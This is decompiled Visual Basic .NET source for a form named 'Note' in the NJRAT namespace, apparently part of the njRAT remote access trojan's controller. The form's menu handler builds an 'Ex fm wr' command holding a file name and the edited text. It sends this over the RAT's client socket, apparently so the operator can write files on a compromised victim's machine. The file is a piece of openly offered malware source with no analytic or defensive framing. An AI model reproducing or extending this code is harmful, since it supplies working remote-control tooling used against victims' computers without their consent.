Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.CompilerServices

Namespace NJRAT
	' Token: 0x0200001C RID: 28
	<DesignerGenerated()>
	Public Partial Class Note
		Inherits Form

		' Token: 0x0600042A RID: 1066 RVA: 0x0016BA34 File Offset: 0x00169E34
		<DebuggerNonUserCode()>
		Public Sub New()
			Note.__ENCAddToList(Me)
			Me.InitializeComponent()
		End Sub

		' Token: 0x0600042B RID: 1067 RVA: 0x0016BA4C File Offset: 0x00169E4C
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = Note.__ENCList
			SyncLock _ENCList
				Dim flag As Boolean = Note.__ENCList.Count = Note.__ENCList.Capacity
				If flag Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = Note.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = Note.__ENCList(num4)
						flag = weakReference.IsAlive
						If flag Then
							Dim flag2 As Boolean = num4 <> num
							If flag2 Then
								Note.__ENCList(num) = Note.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					Note.__ENCList.RemoveRange(num, Note.__ENCList.Count - num)
					Note.__ENCList.Capacity = Note.__ENCList.Count
				End If
				Note.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x17000185 RID: 389
		' (get) Token: 0x0600042E RID: 1070 RVA: 0x0016BE80 File Offset: 0x0016A280
		' (set) Token: 0x0600042F RID: 1071 RVA: 0x0016BE98 File Offset: 0x0016A298
		Friend Overridable Property MenuStrip1 As MenuStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._MenuStrip1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As MenuStrip)
				Me._MenuStrip1 = value
			End Set
		End Property

		' Token: 0x17000186 RID: 390
		' (get) Token: 0x06000430 RID: 1072 RVA: 0x0016BEA4 File Offset: 0x0016A2A4
		' (set) Token: 0x06000431 RID: 1073 RVA: 0x0016BEBC File Offset: 0x0016A2BC
		Friend Overridable Property ToolStripMenuItem1 As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._ToolStripMenuItem1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ToolStripMenuItem1_Click
				Dim flag As Boolean = Me._ToolStripMenuItem1 IsNot Nothing
				If flag Then
					RemoveHandler Me._ToolStripMenuItem1.Click, value2
				End If
				Me._ToolStripMenuItem1 = value
				flag = (Me._ToolStripMenuItem1 IsNot Nothing)
				If flag Then
					AddHandler Me._ToolStripMenuItem1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000187 RID: 391
		' (get) Token: 0x06000432 RID: 1074 RVA: 0x0016BF1C File Offset: 0x0016A31C
		' (set) Token: 0x06000433 RID: 1075 RVA: 0x0016BF34 File Offset: 0x0016A334
		Friend Overridable Property TextBox1 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Dim value2 As EventHandler = AddressOf Me.TextBox1_TextChanged
				Dim flag As Boolean = Me._TextBox1 IsNot Nothing
				If flag Then
					RemoveHandler Me._TextBox1.TextChanged, value2
				End If
				Me._TextBox1 = value
				flag = (Me._TextBox1 IsNot Nothing)
				If flag Then
					AddHandler Me._TextBox1.TextChanged, value2
				End If
			End Set
		End Property

		' Token: 0x06000434 RID: 1076 RVA: 0x0016BF94 File Offset: 0x0016A394
		Private Sub ToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			Dim array As String() = New String(8) {}
			array(0) = "Ex"
			array(1) = Class7.string_1
			array(2) = "fm"
			array(3) = Class7.string_1
			array(4) = "wr"
			array(5) = Class7.string_1
			array(6) = Class6.smethod_14(Me.FN)
			array(7) = Class7.string_1
			Dim textBox As TextBox = Me.TextBox1
			Dim text As String = textBox.Text
			textBox.Text = text
			array(8) = Class6.smethod_14(text)
			Me.SK.Send(String.Concat(array))
			Me.ToolStripMenuItem1.Enabled = False
		End Sub

		' Token: 0x06000435 RID: 1077 RVA: 0x0016C03C File Offset: 0x0016A43C
		Private Sub TextBox1_TextChanged(sender As Object, e As EventArgs)
			Me.ToolStripMenuItem1.Enabled = True
		End Sub

		' Token: 0x040001EB RID: 491
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x040001ED RID: 493
		<AccessedThroughProperty("MenuStrip1")>
		Private _MenuStrip1 As MenuStrip

		' Token: 0x040001EE RID: 494
		<AccessedThroughProperty("ToolStripMenuItem1")>
		Private _ToolStripMenuItem1 As ToolStripMenuItem

		' Token: 0x040001EF RID: 495
		<AccessedThroughProperty("TextBox1")>
		Private _TextBox1 As TextBox

		' Token: 0x040001F0 RID: 496
		Public FN As String

		' Token: 0x040001F1 RID: 497
		Public SK As Client
	End Class
End Namespace
